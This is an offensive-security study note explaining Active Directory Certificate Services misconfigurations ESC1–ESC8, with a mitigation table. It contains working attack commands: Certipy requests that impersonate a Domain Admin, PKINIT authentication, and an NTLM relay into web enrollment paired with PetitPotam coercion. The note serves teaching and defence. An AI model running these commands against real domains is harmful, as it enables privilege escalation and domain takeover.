### Active Directory Certificate Services Abuse - ESC1 to ESC8

--> LEGAL/ETHICAL REMINDER: everything below is for authorized environments only - your own lab (e.g. a self-hosted AD lab, GOAD, HackTheBox/TryHackMe AD boxes) or engagements with signed written permission. Abusing a real organization's PKI without authorization is a serious crime (Computer Misuse Act, CFAA, equivalents). Always have written scope/rules of engagement before touching a real domain.

--> This note assumes you already understand basic Kerberos/AD attacks (note 10) and NTLM relay (note 31). It covers AD CS (Active Directory Certificate Services) abuse - the "Certified Pre-Owned" class of misconfigurations that turned out to be one of the most impactful AD privilege-escalation and persistence discoveries of the last several years.

## Why Certificates Are an Identity, Not Just a File

--> AD CS is Microsoft's on-prem PKI - it issues X.509 certificates from certificate templates for purposes like smart-card logon, TLS server auth, and code signing.
--> The critical fact that makes AD CS attackable: a certificate with the right EKU (Extended Key Usage - a field defining what the cert may be used for) and the right subject/SAN can be used to AUTHENTICATE to AD via Kerberos PKINIT or via Schannel, exactly as if you'd typed that user's password. If you can get a certificate issued that maps to another identity, you have effectively stolen that identity - and unlike a stolen password, a stolen/forged cert isn't invalidated by that user changing their password, and it can be valid for years by template configuration.
--> This means the entire attack surface here is: "can I get a certificate issued for an identity I don't own, or with permissions I shouldn't have?" - every ESC scenario below is a different answer to that question.

## ESC1 - Requester-Supplied SAN + Client Auth + Low-Priv Enroll

--> A certificate template is vulnerable if it (a) allows the ENROLLEE to specify an arbitrary Subject Alternative Name (`ENROLLEE_SUPPLIES_SUBJECT` / the "Supply in the request" SAN option), (b) has an EKU permitting client authentication, and (c) grants enrollment rights to a low-privileged group (often `Domain Users`/`Authenticated Users` by default on custom templates cloned from a base template without tightening ACLs).
--> Exploit logic: any low-priv domain user requests a certificate from this template, but specifies the SAN as `administrator@corp.local` (or any Domain Admin's UPN) in the request itself - the CA, trusting the requester's supplied SAN because the template allows it, issues a valid client-auth certificate mapping to the Domain Admin identity.

```bash
# Enumerate vulnerable templates with Certipy
certipy find -u alice@corp.local -p 'Password123' -dc-ip 10.10.10.5 -vulnerable

# Request a cert as Domain Admin by supplying the SAN in the request (ESC1)
certipy req -u alice@corp.local -p 'Password123' -ca corp-CA \
    -template VulnTemplate -upn administrator@corp.local

# Use the issued cert to get a TGT via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
```

## ESC2 - "Any Purpose" or No EKU Restriction

--> A template with the "Any Purpose" EKU (or literally no EKU restriction at all) can be used for whatever purpose the holder wants, including client authentication - functionally similar impact to ESC1 even if the template wasn't intentionally designed for client auth. Low-priv enrollment rights + this EKU is enough on its own.

## ESC3 - Enrollment Agent Templates

--> Some templates are designed to let a holder request certificates ON BEHALF OF another user (an "enrollment agent," historically for smart-card provisioning by helpdesk staff). If enrollment-agent rights on such a template are granted too broadly, an attacker who compromises an account with that right can request a certificate on behalf of a Domain Admin without ever needing that DA's credentials directly.

## ESC4 - Vulnerable Template ACLs

--> If an attacker has WRITE access to the certificate TEMPLATE OBJECT itself (a misconfigured ACL, e.g. an over-permissioned group like `Account Operators` or a custom group with `GenericWrite`), they can reconfigure the template's own settings - flip on `ENROLLEE_SUPPLIES_SUBJECT`, add a client-auth EKU, loosen enrollment permissions - turning any innocuous template into an ESC1-style vulnerable one, request the malicious cert, then (for stealth) revert the template settings afterward.

## ESC5 - Vulnerable PKI Object ACLs Elsewhere

--> The same "write access to the wrong AD object" idea, but applied to OTHER PKI-related objects in AD beyond the template itself - the CA server's computer object, the `CN=Public Key Services` container, the CA's own AD object - write access to any of these can be leveraged toward equivalent compromise (e.g. writing a malicious template into the certificate templates container, or taking over the CA server via resource-based delegation abuse against its computer object - cross-reference note 33).

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

--> This is a CA-LEVEL (not template-level) setting. If the flag `EDITF_ATTRIBUTESUBJECTALTNAME2` is set on the CA, ANY template - even ones that don't explicitly allow `ENROLLEE_SUPPLIES_SUBJECT` - will accept an attacker-supplied SAN via the certificate request's attributes, effectively turning every enrollable template on that CA into an ESC1 candidate at once.

```bash
# Check the flag with certutil
certutil -config "CA01.corp.local\corp-CA" -getreg policy\EditFlags
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 in the output
```

## ESC7 - Vulnerable CA Access Control

--> If an attacker holds (or can obtain) `ManageCA` or `ManageCertificates` rights directly on the CA object itself, they can approve pending certificate requests (bypassing "manager approval required" template settings), or manipulate the CA's own configuration - a management-plane compromise of the PKI rather than a template-level trick.

```bash
certipy ca -u alice@corp.local -p 'Password123' -ca corp-CA -list-officers
# officers with ManageCA/ManageCertificates are the targets to compromise or that
# an attacker already controlling such an account can abuse directly
```

## ESC8 - NTLM Relay to Web Enrollment

--> AD CS optionally exposes a legacy HTTP web enrollment endpoint (`/certsrv/`) that accepts NTLM authentication - and, critically, does NOT enforce Extended Protection for Authentication (EPA)/channel binding by default in many deployments. This makes it a prime NTLM relay target (cross-reference note 31 in full): coerce or capture a machine account's or user's NTLM authentication (via Responder, a coerced authentication like `PetitPotam`/`PrinterBug`, etc.) and relay it straight into a certificate request against the web enrollment endpoint, obtaining a certificate for that relayed identity - often the DC's own machine account, which is disastrous since a DC's machine account certificate can be used to request further tickets/DCSync-equivalent access.

```bash
# ntlmrelayx.py configured to relay captured/coerced NTLM auth directly
# into an ADCS certificate request
ntlmrelayx.py -t https://ca01.corp.local/certsrv/certfnsh.asp --adcs -smb2support

# Combine with a coercion technique to force a DC to authenticate to you
python3 PetitPotam.py <attacker-ip> <dc-ip>
```

## Mitigations Summary

| ESC | Root cause | Primary fix |
|---|---|---|
| ESC1 | Requester-supplied SAN + client auth + broad enroll rights | Remove `ENROLLEE_SUPPLIES_SUBJECT`, restrict enrollment to intended principals |
| ESC2 | Any Purpose / no EKU restriction | Set explicit, minimal EKUs on every template |
| ESC3 | Over-broad enrollment agent rights | Restrict enrollment agent templates to specific trusted accounts/purposes |
| ESC4 | Weak template object ACLs | Audit with `PSPKIAudit`/Certify, restrict `GenericWrite`/`WriteDacl` on templates |
| ESC5 | Weak ACLs on other PKI AD objects | Audit ACLs across the whole PKI container, not just templates |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` CA flag | Disable the flag; requires a CA service restart to take effect |
| ESC7 | Over-broad `ManageCA`/`ManageCertificates` rights | Restrict CA officer rights to a minimal trusted set |
| ESC8 | NTLM relay to unauthenticated/EPA-less web enrollment | Enforce EPA/HTTPS-only on `/certsrv/`, disable NTLM on the CA web service, prefer Kerberos-only |

--> Tooling overview: Certipy (Python, cross-platform, the modern go-to for both enumeration `certipy find` and abuse `certipy req`/`certipy auth`) and Certify (.NET/Windows, the original research tool from the "Certified Pre-Owned" paper) both serve the same purpose - map templates/CA config to identify which ESC scenarios apply, then execute the abuse. BloodHound (with the `ADCS` collection method) increasingly renders these as first-class attack-path edges alongside the traditional AD edges from note 10.

--> Putting it together: ADCS abuse is now a standard stop in most real AD assessments precisely because template misconfigurations are common (organizations clone templates for legitimate business reasons and forget to re-tighten SAN/EKU/enrollment settings) and the payoff - a long-lived, password-reset-resistant certificate mapping to Domain Admin - is as strong as persistence gets short of a Golden Ticket (note 10). See note 31 for the relay mechanics feeding ESC8, and note 33 for how a compromised computer object's write access chains into delegation-based escalation as an alternative to the certificate route.
